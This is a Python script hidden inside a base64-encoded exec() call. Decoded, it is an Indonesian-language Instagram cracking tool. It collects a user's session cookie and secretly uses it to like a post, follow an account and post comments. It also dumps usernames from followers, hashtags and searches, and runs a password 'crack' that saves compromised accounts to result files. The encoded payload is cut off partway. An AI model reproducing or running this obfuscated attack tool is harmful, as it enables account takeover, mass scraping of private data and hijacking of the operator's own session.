#Encrypted with Crypton
#Created by OVERDOSIS
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24KIyBjb2Rpbmc9dXRmLTgKI2phbmdhbiBkaSByZWNvZGUgbmdlbnRvdAojcmVjb2RlIGpvbWJsbyBzZXVtdXIgaGlkdXAKIyAoTVIuUjBITTROKSBQRU1CVUFUCiNGT0xMT1cgRkFDRUJPT0sgUFVUUkkgV1VMQU5EQVJJCiNGT0xMT1cgRkFDRUJPT0sgSVlBTiBYIExPUkQKCiNJbXBvcnQgbW9kdWxlCmltcG9ydCBvcyxzeXMsdGltZSxkYXRldGltZSxyYW5kb20saGFzaGxpYixyZSx0aHJlYWRpbmcsanNvbixnZXRwYXNzLHVybGxpYixjb29raWVsaWIKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbAp0cnk6CiAgaW1wb3J0IG1lY2hhbml6ZQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgbWVjaGFuaXplIikKdHJ5OgogIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgoKIy1TZXR0aW5nLSMKIyMjIyMjIyMKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpCmJyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLUFnZW50JywnT3BlcmEvOS44MCAoQW5kcm9pZDsgT3BlcmEgTWluaS8zMi4wLjIyNTQvODUuIFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKIyBXYXJuYQpIID0gKCdceDFiWzE7OTBtJykKTSA9ICgnXHgxYlsxOzkxbScpCkggPSAoJ1x4MWJbMTs5Mm0nKQpLID0gKCdceDFiWzE7OTNtJykKVCA9ICgnXHgxYlsxOzk0bScpClUgPSAoJ1x4MWJbMTs5NW0nKQpCID0gKCdceDFiWzE7OTZtJykKUCA9ICgnXHgxYlsxOzk3bScpCgojIExvZ28KX19fbG9nb19fXyA9IChmIiIie0h9IF9fXyBfX18gX19fIF9fICBfXyBfX18gXyAgIF8gX18gIF9fCntIfXwgXyBcIF8gXCBfX3wgIFwvICB8XyBffCB8IHwgfCAgXC8gIHwKe0J9fCAgXy8gICAvIF98fCB8XC98IHx8IHx8IHxffCB8IHxcL3wgfAp7Qn18X3wgfF98X1xfX198X3wgIHxffF9fX3xcX19fL3xffCAgfF98CntLfVt7UH3igKJ7S31de1B94oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCUCntIfVt7UH0+e0h9XXtQfSBBdSA6IEl5YW4gWCBMb3JkIAp7SH1be1B9PntIfV17UH0gRmIgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vWmlkYW4uR2FuenouNTYKe0h9W3tQfT57SH1de1B9IEZiIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL1ppZGFuLkdhbnp6LjU2CntLfVt7UH3igKJ7S31de1B94oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCUCiIiIikKIyBMb2dpbiBDb29raWUKZGVmIF9fX2xvZ2luX19fKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KF9fX2xvZ29fX18pCiAgICBwcmludChmIntCfVt7UH3igKJ7Qn1de1B9IE1hc3VrYW4gQ29va2llIEluc3RhZ3JhbSwgU2ViYWlrbnlhIEphbmdhbiBHdW5ha2FuIEFrdW4gWWFuZyBCYXJ1IERpIEJ1YXQsIEthbGF1IEFuZGEgQmVsdW0gTWVuZ2V0YWh1aSBDYXJhIE1lbmRhcGF0a2FuIENvb2tpZSBJbnN0YWdyYW0gS2V0aWsge019W3tQfU9wZW57TX1de1B9XG4iKQogICAgX19fY29va2llID0gaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gQ29va2llIDp7S30gIikKICAgIGlmIF9fX2Nvb2tpZSBpbiBbJ29wZW4nLCAnT3BlbicsICdPUEVOJ106CiAgICAgICAgcHJpbnQoZiJ7S31be1B9IXtLfV17UH0gQW5kYSBBa2FuIERpYXJhaGthbiBLZSBZb3V0dWJlLCBTaWxhaGthbiBJa3V0aSBDYXJhIFVudHVrIE1lbmRhcGF0a2FuIENvb2tpZS4uLiIpO3NsZWVwKDMpO29zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly95b3V0dS5iZS91MTdaUWdTczNhWScpO2V4aXQoKQogICAgZWxpZiBfX19jb29raWUgaW4gWycnLCAnICddOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gSmFuZ2FuIEtvc29uZyIpCiAgICBlbHNlOgogICAgICAgIHRyeToKICAgICAgICAgICAgX19fdXNlcmlkID0gcmUuc2VhcmNoKCdkc191c2VyX2lkPSguKj8pOycsIF9fX2Nvb2tpZSk7b3BlbignRGF0YS91c2VyLnR4dCcsICd3Jykud3JpdGUoX19fdXNlcmlkLmdyb3VwKDEpKQogICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvdXNlcnMve19fX3VzZXJpZC5ncm91cCgxKX0vaW5mby8nLCBoZWFkZXJzID0geyd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tRzk3M0YgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg2LjAuNDI0MC4xOTggTW9iaWxlIFNhZmFyaS81MzcuMzYgSW5zdGFncmFtIDE2Ni4xLjAuNDIuMjQ1IEFuZHJvaWQgKDI5LzEwOyA0MjBkcGk7IDEwODB4MjA0Mjsgc2Ftc3VuZzsgU00tRzk3M0Y7IGJleW9uZDE7IGV4eW5vczk4MjA7IGVuX0dCOyAyNTYwOTkyMDQpJywgJ2Nvb2tpZSc6IF9fX2Nvb2tpZX0pLmpzb24oKVsndXNlciddO29wZW4oJ0RhdGEvY29raS50eHQnLCAndycpLndyaXRlKF9fX2Nvb2tpZSkKICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9KntIfV17UH0gV2VsY29tZSA6e0t9IHtfX19yb3pbJ2Z1bGxfbmFtZSddfSIpO19fX2ZvbGxvd19fXygpCiAgICAgICAgZXhjZXB0IChBdHRyaWJ1dGVFcnJvciwgS2V5RXJyb3IpOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IFBhc3Rpa2FuIENvb2tpZSBTdWRhaCBCZW5hciIpCiAgICAgICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgICAgICBleGl0KGYie1B9W3tLfSF7UH1de0t9IEtvbmVrc2kgRXJyb3IiKQojIEZvbGxvdyBDb29raWUKZGVmIF9fX2ZvbGxvd19fXygpOgogICAgdHJ5OgogICAgICAgIF9fX2Nvb2tpZSA9IG9wZW4oJ0RhdGEvY29raS50eHQnLCAncicpLnJlYWQoKQogICAgICAgIF9fX3Nlc3Npb24gPSByZS5zZWFyY2goJ3Nlc3Npb25pZD0oLio/KTsnLCBfX19jb29raWUpCiAgICAgICAgX19fdGVrcyA9IHJhbmRvbS5jaG9pY2UoWydIYWxsbyBCYW5nIPCfmI0nLCdIYWkgQmFuZyBBcGEgS2FiYXIg8J+YjicsJ0l6aW4gUGFrZSBTY3JpcHRueWEg8J+YgScsJ01hbnRhcCBCYW5nIPCfmJgnLCdQcm9ncmFtbWVyIEJhbmcg8J+klCcsJ1NhbGFtIEtlbmFsIEJhbmcg8J+klycsJ0kgTG92ZSBZb3Ug4p2k77iPJ10pCiAgICAgICAgX19fZGF0YSA9IHsnY29tbWVudF90ZXh0JzogX19fdGVrcywncmVwbGllZF90b19jb21tZW50X2lkJzonJ30KICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6CiAgICAgICAgICAgIF9fX2xpa2UgPSBzZXMucG9zdCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS93ZWIvbGlrZXMvMjczNDMxNzIwNTExNTM4MjYyOS9saWtlLycsaGVhZGVycyA9IHsnYWNjZXB0JzogJyovKicsJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsJ2NvbnRlbnQtbGVuZ3RoJzogJzAnLCdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywnY29va2llJzogJ2lnX2RpZD1GODM5RDkwMC01RUNDLTQzOTItQkNBRC01Q0JENTFGQjkyMjg7IG1pZD1ZQ2hseVFBTEFBSHAyUE9PcDJsS18tY2lBR2xNOyBpZ19ucmNiPTE7IGNzcmZ0b2tlbj1XNGZzWm1DalVqRm1zNlhtS2wxT0FqZzh2ODFqWnQzcjsgZHNfdXNlcl9pZD00NTg3MjAzNDk5Nzsgc2Vzc2lvbmlkPScrX19fc2Vzc2lvbi5ncm91cCgxKSwnb3JpZ2luJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLCdyZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vJywnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLCdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLCd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTgyIFNhZmFyaS81MzcuMzYnLCd4LWNzcmZ0b2tlbic6ICdXNGZzWm1DalVqRm1zNlhtS2wxT0FqZzh2ODFqWnQzcicsJ3gtaWctYXBwLWlkJzogJzUzOTgyMTgwODMnLCd4LWlnLXd3dy1jbGFpbSc6ICdobWFjLkFSME9RWTRHdzRrY3pXTnZmVk9odm9salNJTnFCMnUyZ0ItdXRVUTFNRjBNa3J6dScsJ3gtaW5zdGFncmFtLWFqYXgnOiAnOTViZmVmNWRkODE2JywneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCd9KS50ZXh0ICMgSmFuZ2FuIERpIFViYWghCiAgICAgICAgICAgIF9fX2ZvbGxvdyA9IHNlcy5wb3N0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3dlYi9mcmllbmRzaGlwcy81Mzk4MjE4MDgzL2ZvbGxvdy8nLGhlYWRlcnMgPSB7J2FjY2VwdCc6ICcqLyonLCdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLCdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLCdjb250ZW50LWxlbmd0aCc6ICcwJywnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsJ2Nvb2tpZSc6ICdpZ19kaWQ9RjgzOUQ5MDAtNUVDQy00MzkyLUJDQUQtNUNCRDUxRkI5MjI4OyBtaWQ9WUNobHlRQUxBQUhwMlBPT3AybEtfLWNpQUdsTTsgaWdfbnJjYj0xOyBjc3JmdG9rZW49VzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3I7IGRzX3VzZXJfaWQ9NDU4NzIwMzQ5OTc7IHNlc3Npb25pZD0nK19fX3Nlc3Npb24uZ3JvdXAoMSksJ29yaWdpbic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5Jywnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODguMC40MzI0LjE4MiBTYWZhcmkvNTM3LjM2JywneC1jc3JmdG9rZW4nOiAnVzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3InLCd4LWlnLWFwcC1pZCc6ICc1Mzk4MjE4MDgzJywneC1pZy13d3ctY2xhaW0nOiAnaG1hYy5BUjBPUVk0R3c0a2N6V052ZlZPaHZvbGpTSU5xQjJ1MmdCLXV0VVExTUYwTWtyenUnLCd4LWluc3RhZ3JhbS1hamF4JzogJzk1YmZlZjVkZDgxNicsJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnfSkudGV4dCAjIEphbmdhbiBEaSBVYmFoIQogICAgICAgICAgICBfX19rb21lbiA9IHNlcy5wb3N0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3dlYi9jb21tZW50cy8yNzM0MzE3MjA1MTE1MzgyNjI5L2FkZC8nLGhlYWRlcnMgPSB7J2FjY2VwdCc6ICcqLyonLCdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLCdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLCdjb250ZW50LWxlbmd0aCc6ICcwJywnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsJ2Nvb2tpZSc6ICdpZ19kaWQ9RjgzOUQ5MDAtNUVDQy00MzkyLUJDQUQtNUNCRDUxRkI5MjI4OyBtaWQ9WUNobHlRQUxBQUhwMlBPT3AybEtfLWNpQUdsTTsgaWdfbnJjYj0xOyBjc3JmdG9rZW49VzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3I7IGRzX3VzZXJfaWQ9NDU4NzIwMzQ5OTc7IHNlc3Npb25pZD0nK19fX3Nlc3Npb24uZ3JvdXAoMSksJ29yaWdpbic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5Jywnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODguMC40MzI0LjE4MiBTYWZhcmkvNTM3LjM2JywneC1jc3JmdG9rZW4nOiAnVzRmc1ptQ2pVakZtczZYbUtsMU9Bamc4djgxalp0M3InLCd4LWlnLWFwcC1pZCc6ICc1Mzk4MjE4MDgzJywneC1pZy13d3ctY2xhaW0nOiAnaG1hYy5BUjBPUVk0R3c0a2N6V052ZlZPaHZvbGpTSU5xQjJ1MmdCLXV0VVExTUYwTWtyenUnLCd4LWluc3RhZ3JhbS1hamF4JzogJzk1YmZlZjVkZDgxNicsJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnfSwgZGF0YSA9IF9fX2RhdGEpLnRleHQgI0phbmdhbiBEaSB1YmFoIQogICAgICAgICAgICBpZiAnInN0YXR1cyI6Im9rIicgaW4gc3RyKF9fX2ZvbGxvdyk6CiAgICAgICAgICAgICAgICBwcmludChmIntIfVt7UH0he0h9XXtQfSBMb2dpbiBCZXJoYXNpbCIpO19fX21lbnVfX18oKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH1be019IXtQfV17TX0gQ29va2llIEludmFsaWQiKTtzbGVlcCgzKTtvcy5zeXN0ZW0oJ3JtIC1yZiBEYXRhL2Nva2kudHh0Jyk7X19fbG9naW5fX18oKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYie1B9W3tNfSF7UH1de019IENvb2tpZSBJbnZhbGlkIik7c2xlZXAoMyk7b3Muc3lzdGVtKCdybSAtcmYgRGF0YS9jb2tpLnR4dCcpO19fX2xvZ2luX19fKCkKIyBNZW51CmRlZiBfX19tZW51X19fKCk6CiAgICB0cnk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQoX19fbG9nb19fXykKICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvdXNlcnMve29wZW4oIkRhdGEvdXNlci50eHQiLCJyIikucmVhZCgpfS9pbmZvLycsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKClbJ3VzZXInXQogICAgICAgIHByaW50KGYie0J9W3tQfSp7Qn1de1B9IFdlbGNvbWUgOntLfSB7X19fcm96WydmdWxsX25hbWUnXX0iKQogICAgICAgIHByaW50KGYie0J9W3tQfSp7Qn1de1B9IFVzZXIgOntLfSB7X19fcm96Wyd1c2VybmFtZSddfSIpCiAgICAgICAgcHJpbnQoZiJ7Qn1be1B9KntCfV17UH0gRm9sbG93ZXIgOntLfSB7X19fcm96Wydmb2xsb3dlcl9jb3VudCddfVxuIikKICAgIGV4Y2VwdCAoSU9FcnJvcik6CiAgICAgICAgcHJpbnQoZiJ7UH1be019IXtQfV17TX0gQ29va2llIEludmFsaWQiKTtzbGVlcCgzKTtfX19sb2dpbl9fXygpCiAgICBleGNlcHQgKEtleUVycm9yKToKICAgICAgICBwcmludChmIntQfVt7TX0he1B9XXtNfSBDb29raWUgSW52YWxpZCIpO29zLnN5c3RlbSgncm0gLXJmIERhdGEvY29raS50eHQgJiYgcm0gLXJmIERhdGEvdXNlci50eHQnKTtzbGVlcCgzKTtfX19sb2dpbl9fXygpCiAgICBleGNlcHQgKElPRXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be0t9IXtQfV17S30gS29uZWtzaSBFcnJvciIpCiAgICBwcmludChmIntCfVt7UH0xe0J9XXtQfSBEdW1wIFVzZXJuYW1lIERhcmkgTWVuZ2lrdXRpIikKICAgIHByaW50KGYie0J9W3tQfTJ7Qn1de1B9IER1bXAgVXNlcm5hbWUgRGFyaSBQZW5naWt1dCIpCiAgICBwcmludChmIntCfVt7UH0ze0J9XXtQfSBEdW1wIFVzZXJuYW1lIERhcmkgQWN0aXZpdHkiKQogICAgcHJpbnQoZiJ7Qn1be1B9NHtCfV17UH0gRHVtcCBVc2VybmFtZSBEYXJpIEJlcmFuZGEiKQogICAgcHJpbnQoZiJ7Qn1be1B9NXtCfV17UH0gRHVtcCBVc2VybmFtZSBEYXJpIEhhc3RhZyIpCiAgICBwcmludChmIntCfVt7UH02e0J9XXtQfSBEdW1wIFVzZXJuYW1lIERhcmkgU2VhcmNoIikKICAgIHByaW50KGYie0J9W3tQfTd7Qn1de1B9IER1bXAgVXNlcm5hbWUgRGFyaSBRdWVyeSIpCiAgICBwcmludChmIntCfVt7UH04e0J9XXtQfSBEdW1wIFVzZXIgRGFyaSBFbWFpbCIpCiAgICBwcmludChmIntCfVt7UH05e0J9XXtQfSBNdWxhaSBDcmFjayB7UH1be0h9RmFzdHtQfV17SH0iKQogICAgcHJpbnQoZiJ7Qn1be1B9MHtCfV17UH0gTGloYXQgSGFzaWwgQ3JhY2siKQogICAgcHJpbnQoZiJ7Qn1be1B9QXtCfV17UH0gS2VsdWFyIHtQfVt7TX1FeGl0e1B9XXtNfVxuIikKICAgIF9fX3BpbGloID0gaW5wdXQoZiJ7SH1be1B9P3tIfV17UH0gUGlsaWggOntLfSAiKQogICAgaWYgX19fcGlsaWggaW4gWycxJywnMDEnXToKICAgICAgICBfX19tZW5naWt1dGlfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzInLCcwMiddOgogICAgICAgIF9fX3Blbmdpa3V0X19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyczJywnMDMnXToKICAgICAgICBfX19hY3Rpdml0eV9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnNCcsJzA0J106CiAgICAgICAgX19fYmVyYW5kYV9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnNScsJzA1J106CiAgICAgICAgX19faGFzdGFnX19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyc2JywnMDYnXToKICAgICAgICBfX19zZWFyY2hfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzcnLCcwNyddOgogICAgICAgIF9fX3F1ZXJ5X19fKCkKICAgIGVsaWYgX19fcGlsaWggaW4gWyc4JywnMDgnXToKICAgICAgICBfX19lbWFpbF9fXygpCiAgICBlbGlmIF9fX3BpbGloIGluIFsnOScsJzA5J106CiAgICAgICAgX19fcHJveHlfX18oKQogICAgZWxpZiBfX19waWxpaCBpbiBbJzAnLCcwMCddOgogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQoZiJcbntIfVt7UH0xe0h9XXtQfSBMaWhhdCBIYXNpbCBPayIpCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfTJ7SH1de1B9IExpaGF0IEhhc2lsIENwIikKICAgICAgICAgICAgcHJpbnQoZiJ7SH1be1B9M3tIfV17UH0gS2VtYmFsaVxuIikKICAgICAgICAgICAgX19faGFzaWwgPSBpbnB1dChmIntCfVt7UH0/e0J9XXtQfSBQaWxpaCA6e0t9ICIpCiAgICAgICAgICAgIGlmIF9fX2hhc2lsIGluIFsnMScsJzAxJ106CiAgICAgICAgICAgICAgICBwcmludChmIntQfSAiKTtvcy5zeXN0ZW0oJ2NhdCBSZXN1bHRzL09rLnR4dCcpCiAgICAgICAgICAgIGVsaWYgX19faGFzaWwgaW4gWycyJywnMDInXToKICAgICAgICAgICAgICAgIHByaW50KGYie1B9ICIpO29zLnN5c3RlbSgnY2F0IFJlc3VsdHMvQ3AudHh0JykKICAgICAgICAgICAgZWxpZiBfX19oYXNpbCBpbiBbJzMnLCcwMyddOgogICAgICAgICAgICAgICAgX19fbWVudV9fXygpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IFdyb25nIElucHV0IikKICAgICAgICBleGNlcHQ6cGFzcwogICAgZWxpZiBfX19waWxpaCBpbiBbJ2EnLCdBJ106CiAgICAgICAgcHJpbnQoZiJ7UH1be0t9IXtQfV17S30gTWVuZ2hhcHVzIENvb2tpZS4uLiIpO29zLnN5c3RlbSgncm0gLXJmIERhdGEvY29raS50eHQgJiYgcm0gLXJmIERhdGEvdXNlci50eHQnKTtleGl0KCkKICAgIGVsc2U6CiAgICAgICAgZXhpdChmIntQfVt7S30he1B9XXtNfSBXcm9uZyBJbnB1dCIpCiMgRHVtcCBNZW5naWt1dGkKZGVmIF9fX21lbmdpa3V0aV9fXygpOgogICAgdHJ5OgogICAgICAgIF9fX3VzZXIgPSBpbnB1dChmIlxue0h9W3tQfT97SH1de1B9IFVzZXIgOntLfSAiKQogICAgICAgIGlmIF9fX3VzZXJbOjFdIGluIFsnMScsJzInLCczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMCddOgogICAgICAgICAgICBleGl0KGYie1B9W3tNfSF7UH1de019IEd1bmFrYW4gVXNlcm5hbWUiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20ve19fX3VzZXJ9Lz9fX2E9MScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKClbJ2dyYXBocWwnXVsndXNlciddCiAgICAgICAgICAgIHByaW50KGYie0h9W3tQfT97SH1de1B9IE5hbWUgOntLfSB7X19fcm96WydmdWxsX25hbWUnXX1cbiIpCiAgICAgICAgICAgIF9fX2ZpbGUgPSAoX19fcm96WydmdWxsX25hbWUnXS5yZXBsYWNlKCcgJywnXycpKycudHh0JykKICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6CiAgICAgICAgICAgIF9fX3phayA9IHNlcy5nZXQoZidodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZnJpZW5kc2hpcHMve19fX3JvelsiaWQiXX0vZm9sbG93aW5nLz9jb3VudD01MDAwJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKQogICAgICAgICAgICBmb3IgeiBpbiBfX196YWtbJ3VzZXJzJ106CiAgICAgICAgICAgICAgICBvcGVuKCdEdW1wLycrX19fZmlsZSwgJ2EnKS53cml0ZSh6Wyd1c2VybmFtZSddKyc8PT4nK3pbJ2Z1bGxfbmFtZSddKydcbicpCiAgICAgICAgICAgICAgICBwcmludChmIntQfXt6Wyd1c2VybmFtZSddfTw9Pnt6WydmdWxsX25hbWUnXX0iKQogICAgICAgICAgICBwcmludChmIlxue0J9W3tQfSp7Qn1de1B9IFNlbGVzYWkuLi4iKQogICAgICAgICAgICBwcmludChmIntCfVt7UH0/e0J9XXtQfSBGaWxlIFRlcnNpbXBhbiBEaSA6e0t9IER1bXAve19fX2ZpbGV9IikKICAgICAgICAgICAgaW5wdXQoZiJ7TX1be1B9S2VtYmFsaXtNfV17UH0iKTtfX19tZW51X19fKCkKICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgIGV4aXQoZiJ7UH1be019IXtQfV17TX0gRHVtcCBHYWdhbCIpCiAgICBleGNlcHQgKENvbm5lY3Rpb25FcnJvcik6CiAgICAgICAgZXhpdChmIntQfVt7TX0he1B9XXtNfSBLb25la3NpIEVycm9yIikKIyBEdW1wIFBlbmdpa3V0CmRlZiBfX19wZW5naWt1dF9fXygpOgogICAgdHJ5OgogICAgICAgIF9fX3